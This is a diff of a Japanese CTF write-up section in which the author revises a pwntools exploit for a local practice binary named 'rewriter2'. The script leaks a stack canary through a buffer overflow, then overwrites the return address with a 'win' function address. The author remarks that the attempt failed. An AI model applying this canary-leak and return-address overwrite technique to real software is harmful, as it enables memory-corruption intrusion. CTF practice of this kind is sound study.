@@ -224,26 +224,40 @@ Aborted (core dumped)
 ## (4) エクスプロイトコードの作成(今回は、ローカルで実施する)
 ```
 from pwn import *
+from sys import argv
+from time import sleep
 
-def out_get(io):
-        for i in range(14):
-                log.info(io.recvline())
-
+win = 0x4012c2
 
 io = process('./rewriter2')
-out_get(io)
 
-log.info(io.recv(21))
-io.send(b"a"*41)
+io.recvuntil('?')
 
-log.info(io.recv(6 + 42))
+payload=b"a"*41
+io.send(payload)
 
-canary = io.recv(8)
-log.info(canary)
+io.recvuntil(payload)
 
-out_get(io)
 
-log.info(io.recv(18))
+canary = u64(b'\0' + io.recv(7))
 
-io.send(b"a"*41 + canary + "a" *
+log.info("canary: " + hex(canary))
+
+io.recvuntil('?')
+
+
+payload = b'a'*40
+payload += p64(canary)
+payload += b'a'*8
+payload += p64(win)
+
+io.send(payload)
+
+io.interactive()
 ```
+
+![image](https://github.com/user-attachments/assets/046413c6-bb50-4359-9c23-13aecdc2c9b7)
+
+行けなかった。
+
+####
